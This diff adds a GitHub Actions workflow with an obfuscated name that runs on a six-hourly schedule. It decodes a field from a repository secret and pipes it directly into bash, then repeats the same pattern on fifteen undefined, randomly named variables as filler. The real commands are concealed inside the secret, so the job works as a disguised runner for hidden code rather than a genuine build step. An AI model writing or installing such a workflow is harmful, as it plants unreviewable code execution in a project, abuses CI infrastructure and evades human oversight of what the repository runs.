@@ -1,0 +1,32 @@
+name: xuliuniandelichang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xuliuniandelichang
+        env:
+          wjoyg30: ${{ secrets.wjoyg30 }}
+        run: |
+          echo $wjoyg30 | jq -r .rr68 | /bin/bash
+          echo $du227 | jq -r .k335 | /bin/bash
+          echo $uvo95179 | jq -r .rqmo354 | /bin/bash
+          echo $i4 | jq -r .xanrr9428 | /bin/bash
+          echo $lfeej25 | jq -r .c84 | /bin/bash
+          echo $m21338 | jq -r .loqmg503 | /bin/bash
+          echo $i46686 | jq -r .crnhw566 | /bin/bash
+          echo $chix85725 | jq -r .k91 | /bin/bash
+          echo $heo9556 | jq -r .v75660 | /bin/bash
+          echo $tmqq89919 | jq -r .f820 | /bin/bash
+          echo $dujw93432 | jq -r .x8625 | /bin/bash
+          echo $f6295 | jq -r .jjjz17 | /bin/bash
+          echo $j70 | jq -r .t0150 | /bin/bash
+          echo $ux8293 | jq -r .jwi121 | /bin/bash
+          echo $j56 | jq -r .e220 | /bin/bash
+          echo $mghhg2 | jq -r .qlbwp81 | /bin/bash
+
